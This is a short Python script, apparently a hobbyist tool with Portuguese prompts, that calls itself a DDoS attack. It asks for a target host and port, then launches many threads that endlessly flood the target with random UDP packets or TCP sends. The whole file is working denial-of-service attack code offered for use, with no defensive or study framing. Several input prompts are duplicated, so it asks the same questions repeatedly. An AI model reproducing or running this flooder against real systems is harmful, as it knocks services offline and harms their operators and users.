#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("SCRIPT INSTALADO COM SUCESSO!")
print("DDOS ATAQUE!")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" DDOS/UDP/TCP(y/n):"))
times = int(input(" Número de ddos!:"))
times = int(input(" Número de ddos!:"))
times = int(input(" Número de ddos!:"))
times  =  int ( input ( "Número de ddos ​​!:" ))
times  =  int ( input ( "Número de ddos ​​!:" ))
times  =  int ( input ( "Número de ddos ​​!:" ))
threads = int(input(" Potencia:"))
threads = int(input(" Potencia:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
